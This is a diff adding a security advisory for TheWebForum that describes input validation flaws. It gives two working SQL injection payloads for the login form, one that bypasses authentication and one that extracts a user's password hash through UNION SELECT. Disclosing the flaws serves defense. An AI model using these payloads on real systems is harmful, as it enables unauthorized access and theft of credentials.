@@ -1,0 +1,15 @@
+source: http://www.securityfocus.com/bid/16161/info
+
+TheWebForum is prone to multiple input validation vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input.
+
+Successful exploitation of these vulnerabilities could result in a compromise of the application, disclosure or modification of data, the theft of cookie-based authentication credentials and allow an attacker to control how the site is rendered to the user. They may also permit an attacker to exploit vulnerabilities in the underlying database implementation as well as other attacks. 
+
+Authentication bypass example (SQL Injection):
+http://www.example.com/twf/login.php
+User Name: a' or 'a'='a'/*
+Password: anypassword
+
+Get user's password hash example (SQL Injection):
+http://www.example.com/twf/login.php
+User Name: a' union select N,password, 3 from users/*
+User name will contain password's hash of user with ID=N 
